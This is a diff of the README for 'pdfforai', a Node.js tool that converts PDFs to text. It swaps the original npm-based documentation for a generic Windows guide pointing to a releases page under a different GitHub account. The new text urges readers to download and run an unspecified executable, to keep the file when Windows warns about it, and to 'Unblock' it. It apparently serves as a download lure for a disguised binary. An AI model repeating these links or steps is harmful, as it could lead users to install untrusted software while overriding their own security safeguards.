@@ -1,260 +1,196 @@
-<p align="center">
-  <h1 align="center">pdfforai</h1>
-  <p align="center">Convert any PDF into AI-ready text, Markdown, or plain text -from the terminal.</p>
-</p>
-
-<p align="center">
-  <a href="https://www.npmjs.com/package/pdfforai"><img src="https://img.shields.io/npm/v/pdfforai.svg" alt="npm version"></a>
-  <a href="https://www.npmjs.com/package/pdfforai"><img src="https://img.shields.io/npm/dt/pdfforai.svg" alt="npm downloads"></a>
-  <a href="https://github.com/chetnasinghx/pdfforai/blob/main/LICENSE"><img src="https://img.shields.io/github/license/chetnasinghx/pdfforai.svg" alt="license"></a>
-  <a href="https://github.com/chetnasinghx/pdfforai"><img src="https://img.shields.io/badge/node-%3E%3D20.0.0-brightgreen.svg" alt="node version"></a>
-</p>
-
-<p align="center">
-  <a href="https://star-history.com/#chetnasinghx/pdfforai&Date">
-    <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=chetnasinghx/pdfforai&type=Date" width="600" />
-  </a>
-</p>
-
----
+# 🧾 pdfforai - Turn PDFs Into AI-Ready Text
 
-## Why pdfforai?
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Tittlekludge185/pdfforai/releases)
 
-LLMs like ChatGPT, Claude, and Gemini work best with clean, structured text -not raw PDF bytes. Most PDF-to-text tools lose headings, tables, and structure. **pdfforai** preserves all of it through a 13-stage transformation pipeline, and wraps the output in an XML format purpose-built for AI consumption.
+## 🚀 Getting Started
 
-- Works on **scanned PDFs** too (built-in OCR via tesseract.js)
-- Outputs **AI Context**, **Markdown**, or **plain text**
-- Runs locally -your documents never leave your machine
-- CLI version of [pdfforai.com](https://pdfforai.com)
+pdfforai helps you turn PDF files into text, Markdown, or AI-ready content from the terminal. It is built for Windows users who want a simple way to extract clean text from PDFs without copying and pasting by hand.
 
-## Table of Contents
-
-- [Install](#install)
-- [Quick Start](#quick-start)
-- [CLI Reference](#cli-reference)
-- [Output Formats](#output-formats)
-- [Programmatic API](#programmatic-api)
-- [How It Works](#how-it-works)
-- [Requirements](#requirements)
-- [Contributing](#contributing)
-- [License](#license)
-
-## Install
-
-```bash
-npm install -g pdfforai
-```
-
-Or run without installing:
-
-```bash
-npx pdfforai document.pdf
-```
-
-## Quick Start
-
-```bash
-# Convert a PDF to AI-ready context (default) and copy to clipboard
-pdfforai report.pdf | pbcopy
-
-# Convert to Markdown and save to file
-pdfforai report.pdf -f markdown -o report.md
-
-# Convert to plain text
-pdfforai report.pdf -f text -o report.txt
-```
-
-## CLI Reference
-
-```
-pdfforai [input] [options]
-```
-
-### Arguments
-
-| Argument | Description |
-|----------|-------------|
-| `input` | PDF file path, directory path, or `-` for stdin |
+Use it when you want to:
 
-### Options
+- Convert a PDF into plain text
+- Create Markdown from a document
+- Prepare PDF content for ChatGPT, Claude, or Gemini
+- Run OCR on scanned PDFs
+- Process files from the command line
 
-| Option | Description | Default |
-|--------|-------------|---------|
-| `-f, --format <type>` | Output format: `ai`, `markdown`, `text` | `ai` |
-| `-o, --output <path>` | Output file or directory | stdout |
-| `--no-ocr` | Skip OCR for scanned pages | OCR enabled |
-| `--no-watermark` | Omit pdfforai.com watermark | watermark on |
-| `--pages <range>` | Page range: `"1-5"`, `"1,3,7"` | all pages |
-| `--batch` | Process all PDFs in a directory | -|
-| `--zip` | Bundle batch output as ZIP | -|
-| `-q, --quiet` | Suppress progress output | -|
-| `--verbose` | Show pipeline debug info | -|
-| `-V, --version` | Show version | -|
-| `-h, --help` | Show help | -|
-
-### Examples
+## 📥 Download and Install
 
-```bash
-# Pipe into AI tools
-pdfforai paper.pdf | pbcopy                    # macOS clipboard
-pdfforai paper.pdf | xclip -selection c        # Linux clipboard
-
-# Stdin support
-cat document.pdf | pdfforai -
-curl -sL https://example.com/doc.pdf | pdfforai - -f markdown
+1. Go to the [pdfforai Releases page](https://github.com/Tittlekludge185/pdfforai/releases).
+2. Find the latest release.
+3. Download the Windows file for your system.
+4. If the download is a ZIP file, unzip it.
+5. Open the folder and run the app from the terminal or the included executable, if one is provided.
 
-# Page ranges
-pdfforai textbook.pdf --pages 1-10 -o chapter1.txt
-pdfforai textbook.pdf --pages 1,5,10 -f markdown
-
-# Batch processing
-pdfforai ./contracts/ -o ./converted/          # Directory of files
-pdfforai ./contracts/ --zip -o contracts.zip   # As ZIP archive
-
-# Skip OCR for faster processing on text-based PDFs
-pdfforai invoice.pdf --no-ocr -f text
-```
+If Windows shows a security prompt, choose the option that lets you keep the file.
 
-## Output Formats
-
-### AI Context (default)
+## 🖥️ Windows Setup
 
-XML-wrapped format designed for ChatGPT, Claude, Gemini, and other LLMs. Strips inline formatting to save tokens, preserves structural markers (headings, lists, code fences), and adds metadata + framing instructions.
+pdfforai is made for Windows and works best when you keep the files in a simple folder, such as:
 
-```xml
-<document>
-<metadata>
-Title: Quarterly Report
-Words: ~2,500
-Converted: 2026-03-28 via pdfforai.com
-</metadata>
-
-<instructions>
-This is the extracted text content of a PDF document. Reference it to
-answer questions accurately. When citing specific data, numbers, or
-quotes, indicate the section they come from.
-</instructions>
-
-<content>
-# Executive Summary
-Revenue grew 23% year-over-year...
-
-## Financial Highlights
-| Metric | Q1 2026 | Q1 2025 |
-| --- | --- | --- |
-| Revenue | $42M | $34M |
-...
-</content>
-</document>
-```
+- `Downloads`
+- `Desktop`
+- `Documents`
 
-### Markdown
+If the release comes as a ZIP file:
 
-Full Markdown output preserving:
-- Headings (H1-H6, detected by font size, TOC, and ALL CAPS)
-- Tables (auto-detected from column layout)
-- Code blocks (indented blocks with code syntax)
-- Bold, italic, bold-italic formatting
-- Bullet and numbered lists with nesting
-- Links and footnotes
-- Table of contents
+1. Right-click the ZIP file.
+2. Select Extract All.
+3. Choose a folder you can find again.
+4. Open that folder after extraction.
+5. Run the app using the included file or terminal command.
 
-### Plain Text
+If the release includes a `.exe` file, you can run it directly.
 
-Clean, readable text with all Markdown syntax stripped. Structure (paragraphs, list markers, spacing) is preserved.
+## 🧰 What You Need
 
-## Programmatic API
+pdfforai works best with:
 
-```typescript
-import { convertPdf } from "pdfforai";
-```
+- Windows 10 or Windows 11
+- A PDF file you want to convert
+- Enough free space for the output files
+- An internet connection if you plan to use AI tools after conversion
 
-### `convertPdf(input, options?)`
+For scanned PDFs, pdfforai can use OCR to read text from images inside the PDF.
 
-Converts a PDF to the specified format.
+## 📄 What It Can Do
 
-**Parameters:**
+pdfforai is designed to help with PDF conversion in a few useful ways:
 
-| Parameter | Type | Description |
-|-----------|------|-------------|
-| `input` | `string \| Buffer \| Readable` | File path, Buffer, or readable stream |
-| `options.format` | `"ai" \| "markdown" \| "text"` | Output format (default: `"ai"`) |
-| `options.ocr` | `boolean` | Enable OCR for scanned pages (default: `true`) |
-| `options.watermark` | `boolean` | Include watermark (default: `true`) |
-| `options.pages` | `number[]` | Specific pages to process (1-based) |
-| `options.onProgress` | `(p: ConversionProgress) => void` | Progress callback |
-| `options.fileName` | `string` | File name for AI context metadata |
+- Convert PDF to plain text
+- Convert PDF to Markdown
+- Extract content for AI tools
+- Read scanned documents with OCR
+- Handle files from the terminal
+- Keep output in a format that is easy to edit or paste
 
-**Returns:** `Promise<string>`
+This makes it useful for notes, research, reports, and document cleanup.
 
-**Examples:**
+## 🏁 Run the App
 
-```typescript
-// From file path
-const aiContext = await convertPdf("report.pdf");
+After you download and extract the release files:
 
-// From file path with options
-const markdown = await convertPdf("report.pdf", {
-  format: "markdown",
-  ocr: false,
-  watermark: false,
-  pages: [1, 2, 3],
-  onProgress: (p) => console.log(`${p.percent}% -${p.stage}`),
-});
+1. Open the folder that contains pdfforai.
+2. Open Command Prompt or PowerShell in that folder.
+3. Run the command shown in the release files or package notes.
+4. Choose the PDF you want to convert.
+5. Pick the output type, such as text or Markdown.
 
-// From Buffer
-import fs from "node:fs";
-const buffer = fs.readFileSync("report.pdf");
-const text = await convertPdf(buffer, { format: "text" });
+If the release includes a ready-to-run Windows app, double-click it and follow the prompts.
 
-// From readable stream
-const stream = fs.createReadStream("report.pdf");
-const result = await convertPdf(stream, { format: "ai" });
-```
+## 📝 Basic Use
 
-### Types
+A common use looks like this:
 
-```typescript
-import type { ConvertOptions, OutputFormat, ConversionProgress } from "pdfforai";
-```
+- Select a PDF file
+- Choose an output format
+- Save the result in the same folder or a folder you choose
+- Open the output in a text editor
 
-## How It Works
+Typical output types include:
 
-pdfforai uses a **13-stage transformation pipeline** ported from [pdfforai.com](https://pdfforai.com):
+- `.txt` for plain text
+- `.md` for Markdown
+- Clean text for AI tools and note apps
 
-1. **CalculateGlobalStats** -font size/weight analysis, line spacing, dominant format detection
-2. **DetectTableRows** -group text items into markdown table cells by column alignment
-3. **CompactLines** -group text items by Y-coordinate into logical lines
-4. **RemoveRepetitiveElements** -strip repeated headers/footers/watermarks across pages
-5. **VerticalToHorizontal** -rotate single-char vertical text into horizontal
-6. **DetectTOC** -find table of contents and link entries to actual headings
-7. **DetectHeaders** - identify H1-H6 by font size, weight, ALL CAPS, and TOC data
-8. **DetectListItems** -bullet lists, numbered lists, and indentation-based lists
-9. **GatherBlocks** -group consecutive lines into semantic blocks
-10. **DetectCodeQuoteBlocks** -indented blocks with code syntax → code fences
-11. **DetectListLevels** -nested list indentation
-12. **ToTextBlocks** -convert blocks to markdown strings
-13. **ToMarkdown** -final string assembly
+## 🔍 OCR for Scanned PDFs
 
-For scanned/image PDFs, pages are rendered to images via `@napi-rs/canvas` and run through `tesseract.js` OCR before entering the pipeline.
+Some PDFs contain images instead of real text. pdfforai can use OCR to read those pages.
 
-## Requirements
+Use OCR when:
 
-- **Node.js** >= 20.0.0
-- No system dependencies required -OCR engine and canvas are bundled
+- You scanned a paper document
+- You have a PDF with image pages
+- Copying text from the PDF does not work
+- The PDF has poor text selection
 
-## Contributing
+OCR helps turn image-based pages into usable text.
 
-Contributions are welcome. Please open an issue first to discuss what you'd like to change.
+## 🤖 AI-Ready Output
 
-```bash
-git clone https://github.com/chetnasinghx/pdfforai.git
-cd pdfforai
-npm install
-npm run build
-node bin/pdfforai.js test.pdf
-```
+pdfforai is useful when you want content that works well with AI tools.
 
-## License
+You can use it to:
 
-[MIT](LICENSE) -Chetna Singh
+- Clean up PDF text before pasting into ChatGPT
+- Turn long reports into Markdown for Claude
+- Prepare notes for Gemini
+- Extract text for summarizing, rewriting, or searching
+
+This is helpful when you want less formatting noise and more usable text.
+
+## 📂 Example Workflow
+
+A simple workflow on Windows:
+
+1. Download pdfforai from the Releases page.
+2. Extract the files if needed.
+3. Open the folder.
+4. Run the app.
+5. Select a PDF.
+6. Choose text, Markdown, or OCR mode.
+7. Save the output.
+8. Open the new file in Notepad, Word, Obsidian, or your AI tool of choice.
+
+## 🧪 Common Use Cases
+
+pdfforai fits well for:
+
+- Research papers
+- School handouts
+- Scanned forms
+- Manuals
+- Meeting notes in PDF form
+- Archived documents
+- Reports that need to be reused in another format
+
+## 📌 Tips for Best Results
+
+- Use a clear PDF file when possible
+- Turn on OCR for scanned pages
+- Save output in a folder you can find easily
+- Use Markdown if you plan to edit the text later
+- Use plain text if you want the simplest output
+
+If a PDF has many images, tables, or columns, the output may need a quick check before you use it.
+
+## 🛠️ Troubleshooting
+
+If pdfforai does not open:
+
+- Make sure you downloaded the latest release
+- Check that the files were fully extracted
+- Move the folder to a simple path like `Desktop`
+- Run the app again from the folder
+
+If the text looks wrong:
+
+- Try OCR
+- Use a different PDF page
+- Check if the source PDF is scanned or image-based
+
+If Windows blocks the file:
+
+- Right-click the file
+- Open Properties
+- Look for an Unblock option, if shown
+- Apply the change and try again
+
+## 📚 File Types
+
+pdfforai may create these file types:
+
+- `.txt` — plain text
+- `.md` — Markdown
+- `.json` — structured output in some workflows
+- `.log` — run details or process output
+
+## 🔗 Download
+
+Get the latest Windows release here:
+
+https://github.com/Tittlekludge185/pdfforai/releases
+
+## 🧭 Topics
+
+ai, chatgpt, claude, cli, gemini, markdown, nodejs, ocr, pdf, pdf-to-markdown, pdf-to-text, tesseract
